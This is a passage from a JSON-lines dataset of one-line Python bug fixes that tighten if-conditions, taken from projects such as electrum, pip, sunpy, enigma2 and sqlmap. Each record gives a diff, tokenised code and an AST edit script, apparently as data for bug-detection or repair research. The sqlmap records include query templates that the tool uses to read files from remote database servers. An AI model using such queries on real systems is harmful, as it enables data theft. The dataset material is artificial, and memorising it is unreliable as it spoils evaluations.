\"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:remaining\", \"T\"], 0], [\"Insert\", \"N1\", [\"is:is\", \"T\"], 1], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 2], [\"Insert\", \"N1\", [\"none:None\", \"T\"], 3]]"}
{"project": "ubuntu-tweak", "commit_sha": "ed3b3f2ed2f2d40ccc2f1bb690ca4c82afbba9c3", "parent_sha": "a8a436fdcc42551064f9fcd58e98bd515031d29d", "file_path": "ubuntutweak/modules/compiz.py", "project_url": "https://github.com/muzena/ubuntu-tweak", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -340,7 +340,7 @@ class Compiz(TweakModule, CompizSetting):\n         enable = False\n         count = 0\n         for k, v in plugins_settings.items():\n-            if self.context.Plugins.has_key(k):\n+            if self.context.Plugins.has_key(k) and self.context.Plugins[k].Display.has_key(v):\n                 plugin = self.context.Plugins[k]\n                 combobox.append_text(plugins[k])\n                 setting = plugin.Display[v]\n", "before": "if self . context . Plugins . has_key ( k ) : plugin = self . context . Plugins [ k ] combobox . append_text ( plugins [ k ] ) setting = plugin . Display [ v ]", "after": "if self . context . Plugins . has_key ( k ) and self . context . Plugins [ k ] . Display . has_key ( v ) : plugin = self . context . Plugins [ k ] combobox . append_text ( plugins [ k ] ) setting = plugin . Display [ v ]", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 6, 44], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"call\", 3, 16, 3, 47], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N3\"], 1], [\"Insert\", \"N2\", [\"attribute\", \"N4\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:has_key\", \"T\"], 2], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"identifier:v\", \"T\"], 1], [\"Insert\", \"N3\", [\"):)\", \"T\"], 2], [\"Insert\", \"N4\", [\"subscript\", \"N5\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:Display\", \"T\"], 2], [\"Insert\", \"N5\", [\"attribute\", \"N6\"], 0], [\"Insert\", \"N5\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N5\", [\"identifier:k\", \"T\"], 2], [\"Insert\", \"N5\", [\"]:]\", \"T\"], 3], [\"Insert\", \"N6\", [\"attribute\", \"N7\"], 0], [\"Insert\", \"N6\", [\".:.\", \"T\"], 1], [\"Insert\", \"N6\", [\"identifier:Plugins\", \"T\"], 2], [\"Insert\", \"N7\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N7\", [\".:.\", \"T\"], 1], [\"Insert\", \"N7\", [\"identifier:context\", \"T\"], 2]]"}
{"project": "bCNC-4axis", "commit_sha": "0deff2c6f94c673be6af08764a86a863fd5503c5", "parent_sha": "9e6e3ed931d8bc4be8bdb8f1e9ec9eeedd7ae825", "file_path": "lib/bpath.py", "project_url": "https://github.com/dguerizec/bCNC-4axis", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -594,7 +594,7 @@ class Path(list):\n \t\t\t# Join with the previous edge\n \t\t\tif eq(Eo,So):\n \t\t\t\t# possibly a full circle\n-\t\t\t\tif segment.type != LINE:\n+\t\t\t\tif segment.type != LINE and len(self)==1:\n \t\t\t\t\tpath.append(Segment(segment.type, Eo, So, segment.center))\n \n \t\t\telif Op is not None:\n", "before": "if segment . type != LINE : path . append ( Segment ( segment . type , Eo , So , segment . center ) )", "after": "if segment . type != LINE and len ( self ) == 1 : path . append ( Segment ( segment . type , Eo , So , segment . center ) )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 5, 4, 64], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 8, 3, 28], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"call\", \"N2\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"integer:1\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:len\", \"T\"], 0], [\"Insert\", \"N2\", [\"argument_list\", \"N3\"], 1], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"identifier:self\", \"T\"], 1], [\"Insert\", \"N3\", [\"):)\", \"T\"], 2]]"}
{"project": "electrum", "commit_sha": "397f07ca823a54351a3dd83692379fced9383c7b", "parent_sha": "117c5631824fa588dec5d01798939582eec1bc66", "file_path": "lib/plugins.py", "project_url": "https://github.com/UnitedBitcoin/electrum", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -43,7 +43,7 @@ def run_hook(name, *args):\n     results = []\n     f_list = hooks.get(name,[])\n     for p, f in f_list:\n-        if not p.is_enabled():\n+        if name != 'load_wallet' and not p.is_enabled():\n             continue\n         try:\n             r = f(*args)\n", "before": "if not p . is_enabled ( ) : continue", "after": "if name != 'load_wallet' and not p . is_enabled ( ) : continue", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 21], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"not_operator\", 3, 12, 3, 30], 2], [\"Insert\", \"N1\", [\"identifier:name\", \"T\"], 0], [\"Insert\", \"N1\", [\"!=:!=\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:'load_wallet'\", \"T\"], 2]]"}
{"project": "electrum", "commit_sha": "5e61ff18ac29ae303fbb0d9479d2824d7fcaf6ec", "parent_sha": "621a3abf6feee9aac4bbd59b409b9edfe669e1b2", "file_path": "gui/qt/history_list.py", "project_url": "https://github.com/UnitedBitcoin/electrum", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -106,7 +106,7 @@ class HistoryList(MyTreeWidget):\n                 if i!=2:\n                     item.setFont(i, QFont(MONOSPACE_FONT))\n                     item.setTextAlignment(i, Qt.AlignVCenter)\n-            if value < 0:\n+            if value and value < 0:\n                 item.setForeground(3, QBrush(QColor(\"#BC1E1E\")))\n                 item.setForeground(4, QBrush(QColor(\"#BC1E1E\")))\n             if tx_hash:\n", "before": "if value < 0 : item . setForeground ( 3 , QBrush ( QColor ( \"#BC1E1E\" ) ) ) item . setForeground ( 4 , QBrush ( QColor ( \"#BC1E1E\" ) ) )", "after": "if value and value < 0 : item . setForeground ( 3 , QBrush ( QColor ( \"#BC1E1E\" ) ) ) item . setForeground ( 4 , QBrush ( QColor ( \"#BC1E1E\" ) ) )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 5, 65], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:value\", \"T\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 16, 3, 25], 2]]"}
{"project": "sunpy", "commit_sha": "5bf205ce70026c78b14229b5b73e35cf021da578", "parent_sha": "e96598a398dd925659567aef9eea2552b555238d", "file_path": "sunpy/map/basemap.py", "project_url": "https://github.com/ayshih/sunpy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -155,7 +155,7 @@ class BaseMap(np.ndarray):\n     \n     def __getitem__(self, key):\n         \"\"\"Overiding indexing operation to ensure that header is updated\"\"\"\n-        if isinstance(key, tuple):\n+        if isinstance(key, tuple) and type(key[0]) is slice:\n             x_range = [key[1].start, key[1].stop]\n             y_range = [key[0].start, key[0].stop]\n \n", "before": "if isinstance ( key , tuple ) : x_range = [ key [ 1 ] . start , key [ 1 ] . stop ] y_range = [ key [ 0 ] . start , key [ 0 ] . stop ]", "after": "if isinstance ( key , tuple ) and type ( key [ 0 ] ) is slice : x_range = [ key [ 1 ] . start , key [ 1 ] . stop ] y_range = [ key [ 0 ] . start , key [ 0 ] . stop ]", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 5, 50], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"call\", 3, 12, 3, 34], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"call\", \"N2\"], 0], [\"Insert\", \"N1\", [\"is:is\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:slice\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:type\", \"T\"], 0], [\"Insert\", \"N2\", [\"argument_list\", \"N3\"], 1], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"subscript\", \"N4\"], 1], [\"Insert\", \"N3\", [\"):)\", \"T\"], 2], [\"Insert\", \"N4\", [\"identifier:key\", \"T\"], 0], [\"Insert\", \"N4\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N4\", [\"integer:0\", \"T\"], 2], [\"Insert\", \"N4\", [\"]:]\", \"T\"], 3]]"}
{"project": "CTPTrader", "commit_sha": "add40dce3bcf9fd7a78cbdd0c47ecb5471fe2535", "parent_sha": "27f000b8340e2fd6ae43435ca4df6a45ddf3a34e", "file_path": "strategies/boll2/boll_2.py", "project_url": "https://github.com/JimmyStudio/CTPTrader", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -130,7 +130,7 @@ class BollStrategy_x(TradeStrategy):\n                                limit_price=tick.last_price + var.slippage * symbol_obj.tick_size)\n \n     def pre_bar_direction_flag(self, var, bar, boll):\n-        if (boll.top - boll.bot)/boll.mid > var.spread_thres and var.signal_count == 0:\n+        if (boll.top - boll.bot)/boll.mid > var.spread_thres and var.signal_count == 0 and var.open_vol == 0:\n             if bar.close < boll.bot:\n                 var.pre_bar_direction_flag = LONG\n             elif bar.close > boll.top:\n", "before": "if ( boll . top - boll . bot ) / boll . mid > var . spread_thres and var . signal_count == 0 : if bar . close < boll . bot : var . pre_bar_direction_flag = LONG elif bar . close > boll . top : ", "after": "if ( boll . top - boll . bot ) / boll . mid > var . spread_thres and var . signal_count == 0 and var . open_vol == 0 : if bar . close < boll . bot : var . pre_bar_direction_flag = LONG elif bar . close > boll . top : ", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Move\", [\"boolean_operator\", 3, 12, 3, 87], [\"boolean_operator\", 3, 12, 3, 87], 0], [\"Insert\", [\"boolean_operator\", 3, 12, 3, 87], [\"and:and\", \"T\"], 1], [\"Insert\", [\"boolean_operator\", 3, 12, 3, 87], [\"comparison_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N0\", [\"integer:0\", \"T\"], 2], [\"Insert\", \"N1\", [\"identifier:var\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:open_vol\", \"T\"], 2]]"}
{"project": "parse2plone", "commit_sha": "f4b34ceeaf9718eb8e92685e28905f968141414a", "parent_sha": "d7ab73cb9bad8f9c184bbb3be49007a8bd2e19ca", "file_path": "parse2plone.py", "project_url": "https://github.com/aclark4life-archive/parse2plone", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -369,7 +369,7 @@ class Parse2Plone(object):\n \n     def set_page(self, page, obj, prefix_path, base, slug_map, rename_map):\n         key = '/'.join(prefix_path) + '/' + obj\n-        if self.slugify:\n+        if self.slugify and key in slug_map['reverse']:\n             value = slug_map['reverse'][key]\n             f = open('/'.join([base, value]), 'rb')\n         elif self.rename and key in rename_map['reverse']:\n", "before": "if self . slugify : value = slug_map [ 'reverse' ] [ key ] f = open ( '/' . join ( [ base , value ] ) , 'rb' ) elif self . rename and key in rename_map [ 'reverse' ] : ", "after": "if self . slugify and key in slug_map [ 'reverse' ] : value = slug_map [ 'reverse' ] [ key ] f = open ( '/' . join ( [ base , value ] ) , 'rb' ) elif self . rename and key in rename_map [ 'reverse' ] : ", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 6, 59], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"attribute\", 3, 12, 3, 24], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:key\", \"T\"], 0], [\"Insert\", \"N1\", [\"in:in\", \"T\"], 1], [\"Insert\", \"N1\", [\"subscript\", \"N2\"], 2], [\"Insert\", \"N2\", [\"identifier:slug_map\", \"T\"], 0], [\"Insert\", \"N2\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N2\", [\"string:'reverse'\", \"T\"], 2], [\"Insert\", \"N2\", [\"]:]\", \"T\"], 3]]"}
{"project": "pip", "commit_sha": "5c3f415f236ba3e39b9e285f36ad5372fd1110a0", "parent_sha": "1447d7d2acb9ff8ec11cc2fa273c070c7362445f", "file_path": "pip/util.py", "project_url": "https://github.com/takluyver/pip", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -26,7 +26,7 @@ __all__ = ['rmtree', 'display_path', 'backup_dir',\n \n \n def get_prog():\n-    if sys.argv and os.path.basename(sys.argv[0]) in ('__main__.py', '-c'):\n+    if hasattr(sys, 'argv') and sys.argv and os.path.basename(sys.argv[0]) in ('__main__.py', '-c'):\n         return \"%s -m pip\" % sys.executable\n     return sys.argv[0]\n \n", "before": "if sys . argv and os . path . basename ( sys . argv [ 0 ] ) in ( '__main__.py' , '-c' ) : return \"%s -m pip\" % sys . executable", "after": "if hasattr ( sys , 'argv' ) and sys . argv and os . path . basename ( sys . argv [ 0 ] ) in ( '__main__.py' , '-c' ) : return \"%s -m pip\" % sys . executable", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 8, 3, 75], [\"boolean_operator\", \"N0\"], 0], [\"Insert\", \"N0\", [\"call\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"attribute\", 3, 8, 3, 16], 2], [\"Insert\", \"N1\", [\"identifier:hasattr\", \"T\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"identifier:sys\", \"T\"], 1], [\"Insert\", \"N2\", [\",:,\", \"T\"], 2], [\"Insert\", \"N2\", [\"string:'argv'\", \"T\"], 3], [\"Insert\", \"N2\", [\"):)\", \"T\"], 4]]"}
{"project": "sqlmap", "commit_sha": "e835a2af9ad99e280cc050c13ebde8f88c1c8c57", "parent_sha": "3e2c3851f3351dfead6b049f57469622297b98a6", "file_path": "plugins/generic/filesystem.py", "project_url": "https://github.com/maycon/sqlmap", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -39,8 +39,8 @@ class Filesystem:\n         if Backend.isDbms(DBMS.MYSQL):\n             lengthQuery = \"SELECT LENGTH(LOAD_FILE('%s'))\" % remoteFile\n \n-        elif Backend.isDbms(DBMS.PGSQL):\n-                lengthQuery = \"SELECT LENGTH(data) FROM pg_largeobject WHERE loid=%d\" % self.oid\n+        elif Backend.isDbms(DBMS.PGSQL) and not fileRead:\n+            lengthQuery = \"SELECT LENGTH(data) FROM pg_largeobject WHERE loid=%d\" % self.oid\n \n         elif Backend.isDbms(DBMS.MSSQL):\n             self.createSupportTbl(self.fileTblName, self.tblField, \"VARBINARY(MAX)\")\n", "before": "if Backend . isDbms ( DBMS . MYSQL ) : lengthQuery = \"SELECT LENGTH(LOAD_FILE('%s'))\" % remoteFile elif Backend . isDbms ( DBMS . PGSQL ) : lengthQuery = \"SELECT LENGTH(data) FROM pg_largeobject WHERE loid=%d\" % self . oid elif Backend . isDbms ( DBMS . MSSQL ) : self . createSupportTbl ( self . fileTblName , self . tblField , \"VARBINARY(MAX)\" )", "after": "if Backend . isDbms ( DBMS . MYSQL ) : lengthQuery = \"SELECT LENGTH(LOAD_FILE('%s'))\" % remoteFile elif Backend . isDbms ( DBMS . PGSQL ) and not fileRead : lengthQuery = \"SELECT LENGTH(data) FROM pg_largeobject WHERE loid=%d\" % self . oid elif Backend . isDbms ( DBMS . MSSQL ) : self . createSupportTbl ( self . fileTblName , self . tblField , \"VARBINARY(MAX)\" )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"elif_clause\", 3, 9, 4, 97], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"call\", 3, 14, 3, 40], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"not_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 0], [\"Insert\", \"N1\", [\"identifier:fileRead\", \"T\"], 1]]"}
{"project": "sqlmap", "commit_sha": "e17e703e3e9c5892509747d9e4b85a2121f01e3e", "parent_sha": "fb645b90f7797c69875d514fe7946803272f7740", "file_path": "lib/core/convert.py", "project_url": "https://github.com/maycon/sqlmap", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -159,7 +159,7 @@ def stdoutencode(data):\n         if IS_WIN:\n             output = data.encode(sys.stdout.encoding, \"replace\")\n \n-            if '?' in output:\n+            if '?' in output and '?' not in data:\n                 warnMsg = \"cannot properly display Unicode characters \"\n                 warnMsg += \"inside Windows OS command prompt \"\n                 warnMsg += \"(http://bugs.python.org/issue1602). All \"\n", "before": "if '?' in output : warnMsg = \"cannot properly display Unicode characters \" warnMsg += \"inside Windows OS command prompt \" warnMsg += \"(http://bugs.python.org/issue1602). All \"", "after": "if '?' in output and '?' not in data : warnMsg = \"cannot properly display Unicode characters \" warnMsg += \"inside Windows OS command prompt \" warnMsg += \"(http://bugs.python.org/issue1602). All \"", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 6, 70], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 16, 3, 29], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"string:'?'\", \"T\"], 0], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 1], [\"Insert\", \"N1\", [\"in:in\", \"T\"], 2], [\"Insert\", \"N1\", [\"identifier:data\", \"T\"], 3]]"}
{"project": "home-assistant", "commit_sha": "7ca025f653a3bfe008bf1d3ef7fdb17b3a429fcf", "parent_sha": "570cfc60c54ea073ada7d157e4f6b19950eb6b34", "file_path": "homeassistant/components/sensor/wunderground.py", "project_url": "https://github.com/keerts/home-assistant", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -196,7 +196,7 @@ class WUndergroundSensor(Entity):\n     @property\n     def entity_picture(self):\n         \"\"\"Return the entity picture.\"\"\"\n-        if self._condition == 'weather':\n+        if self.rest.data and self._condition == 'weather':\n             url = self.rest.data['icon_url']\n             return re.sub(r'^http://', 'https://', url, flags=re.IGNORECASE)\n \n", "before": "if self . _condition == 'weather' : url = self . rest . data [ 'icon_url' ] return re . sub ( r'^http://' , 'https://' , url , flags = re . IGNORECASE )", "after": "if self . rest . data and self . _condition == 'weather' : url = self . rest . data [ 'icon_url' ] return re . sub ( r'^http://' , 'https://' , url , flags = re . IGNORECASE )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 5, 77], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 12, 3, 40], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:data\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:rest\", \"T\"], 2]]"}
{"project": "enigma2", "commit_sha": "88e9fae8a30ce1980523dbbf6ba50cf761b7ecb8", "parent_sha": "32a6cec2617035851a257a98aafaeebf8da87770", "file_path": "lib/python/Screens/ChoiceBox.py", "project_url": "https://github.com/nx111/enigma2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -211,7 +211,7 @@ class ChoiceBox(Screen):\n \n \tdef displayDescription(self):\n \t\tcursel = self[\"list\"].l.getCurrentSelection()\n-\t\tif cursel and len(cursel[0]) == 3:\n+\t\tif cursel and len(cursel[0]) == 3 and isinstance(cursel[0][2], str):\n \t\t\tself[\"description\"].setText(cursel[0][2])\n \t\telse:\n \t\t\tself[\"description\"].setText(\"\")\n", "before": "if cursel and len ( cursel [ 0 ] ) == 3 : self [ \"description\" ] . setText ( cursel [ 0 ] [ 2 ] ) else : self [ \"description\" ] . setText ( \"\" )", "after": "if cursel and len ( cursel [ 0 ] ) == 3 and isinstance ( cursel [ 0 ] [ 2 ] , str ) : self [ \"description\" ] . setText ( cursel [ 0 ] [ 2 ] ) else : self [ \"description\" ] . setText ( \"\" )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Move\", [\"boolean_operator\", 3, 6, 3, 36], [\"boolean_operator\", 3, 6, 3, 36], 0], [\"Insert\", [\"boolean_operator\", 3, 6, 3, 36], [\"and:and\", \"T\"], 1], [\"Insert\", [\"boolean_operator\", 3, 6, 3, 36], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"identifier:isinstance\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"subscript\", \"N2\"], 1], [\"Insert\", \"N1\", [\",:,\", \"T\"], 2], [\"Insert\", \"N1\", [\"identifier:str\", \"T\"], 3], [\"Insert\", \"N1\", [\"):)\", \"T\"], 4], [\"Insert\", \"N2\", [\"subscript\", \"N3\"], 0], [\"Insert\", \"N2\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N2\", [\"integer:2\", \"T\"], 2], [\"Insert\", \"N2\", [\"]:]\", \"T\"], 3], [\"Insert\", \"N3\", [\"identifier:cursel\", \"T\"], 0], [\"Insert\", \"N3\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N3\", [\"integer:0\", \"T\"], 2], [\"Insert\", \"N3\", [\"]:]\", \"T\"], 3]]"}
{"project": "enigma2", "commit_sha": "7311d4db3cd54f8af6e130b1081971807e19f9c7", "parent_sha": "c16592973b270b3eb849ede24b20530c1b65ce5a", "file_path": "lib/python/Screens/ParentalControlSetup.py", "project_url": "https://github.com/nx111/enigma2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -14,7 +14,7 @@ from operator import itemgetter\n \n class ProtectedScreen:\n \tdef __init__(self):\n-\t\tif self.isProtected():\n+\t\tif self.isProtected() and config.ParentalControl.servicepin[0].value != 0:\n \t\t\tself.onFirstExecBegin.append(boundFunction(self.session.openWithCallback, self.pinEntered, PinInput, pinList=[x.value for x in config.ParentalControl.servicepin], triesEntry=config.ParentalControl.retries.servicepin, title=_(\"Please enter the correct pin code\"), windowTitle=_(\"Enter pin code\")))\n \n \tdef isProtected(self):\n", "before": "if self . isProtected ( ) : self . onFirstExecBegin . append ( boundFunction ( self . session . openWithCallback , self . pinEntered , PinInput , pinList = [ x . value for x in config . ParentalControl . servicepin ] , triesEntry = config . ParentalControl . retries . servicepin , title = _ ( \"Please enter the correct pin code\" ) , windowTitle = _ ( \"Enter pin code\" ) ) )", "after": "if self . isProtected ( ) and config . ParentalControl . servicepin [ 0 ] . value != 0 : self . onFirstExecBegin . append ( boundFunction ( self . session . openWithCallback , self . pinEntered , PinInput , pinList = [ x . value for x in config . ParentalControl . servicepin ] , triesEntry = config . ParentalControl . retries . servicepin , title = _ ( \"Please enter the correct pin code\" ) , windowTitle = _ ( \"Enter pin code\" ) ) )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 3, 4, 300], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"call\", 3, 6, 3, 24], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"!=:!=\", \"T\"], 1], [\"Insert\", \"N1\", [\"integer:0\", \"T\"], 2], [\"Insert\", \"N2\", [\"subscript\", \"N3\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:value\", \"T\"], 2], [\"Insert\", \"N3\", [\"attribute\", \"N4\"], 0], [\"Insert\", \"N3\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N3\", [\"integer:0\", \"T\"], 2], [\"Insert\", \"N3\", [\"]:]\", \"T\"], 3], [\"Insert\", \"N4\", [\"attribute\", \"N5\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:servicepin\", \"T\"], 2], [\"Insert\", \"N5\", [\"identifier:config\", \"T\"], 0], [\"Insert\", \"N5\", [\".:.\", \"T\"], 1], [\"Insert\", \"N5\", [\"identifier:ParentalControl\", \"T\"], 2]]"}
{"project": "OoT-Randomizer", "commit_sha": "aca831dd3780c6c8f400e2dc342443b30bcde419", "parent_sha": "208c1e6b6375ac59cf395ddea1bff695edb3ab28", "file_path": "Hints.py", "project_url": "https://github.com/TestRunnerSRL/OoT-Randomizer", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -553,7 +553,7 @@ def buildGossipHints(spoiler, world):\n         if hint == None:\n             index = hint_types.index(hint_type)\n             hint_prob[index] = 0\n-            if world.hint_dist == \"tournament\":\n+            if world.hint_dist == \"tournament\" and hint_type == 'random':\n                 raise Exception('Not enough valid %s hints for tournament distribution' % hint_type)\n         else:\n             gossip_text, location = hint\n", "before": "if world . hint_dist == \"tournament\" : raise Exception ( 'Not enough valid %s hints for tournament distribution' % hint_type )", "after": "if world . hint_dist == \"tournament\" and hint_type == 'random' : raise Exception ( 'Not enough valid %s hints for tournament distribution' % hint_type )", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 4, 101], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 16, 3, 47], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:hint_type\", \"T\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:'random'\", \"T\"], 2]]"}
{"project": "radical.saga", "commit_sha": "f5f7d826b47e50319f3a5ed33ab81a2402cec041", "parent_sha": "e7e89726ac667a394cf986ff8a016dceb98d8161", "file_path": "saga/adaptors/condor/condorjob.py", "project_url": "https://github.com/radical-cybertools/radical.saga", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -442,7 +442,7 @@ class CondorJobService (saga.adaptors.cpi.job.Service):\n         # the executable to the transfer list.\n         # (Of course not if the executable is already on the target systems,\n         # defined by the fact that it starts with ./\n-        if jd.executable.startswith('./'):\n+        if jd.executable.startswith('./') and os.path.exists(jd.executable):\n \n             # TODO: Check if the executable is already in the file_transfer list,\n             # because then we don't need to implicitly add it anymore.\n", "before": "if jd . executable . startswith ( './' ) : ", "after": "if jd . executable . startswith ( './' ) and os . path . exists ( jd . executable ) : ", "sstub_pattern": "MORE_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 3, 43], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"call\", 3, 12, 3, 42], 0], [\"Insert\", \"N0\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N3\"], 1], [\"Insert\", \"N2\", [\"attribute\", \"N4\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:exists\", \"T\"], 2], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"attribute\", \"N5\"], 1], [\"Insert\", \"N3\", [\"):)\", \"T\"], 2], [\"Insert\", \"N4\", [\"identifier:os\", \"T\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:path\", \"T\"], 2], [\"Insert\", \"N5\", [\"identifier:jd\", \"T\"], 0], [\"Insert\", \"N5\", [\".:.\", \"T\"], 1], [\"Insert\", \"N5\", [\"identifier:executable\", \"T\"], 2]]"}
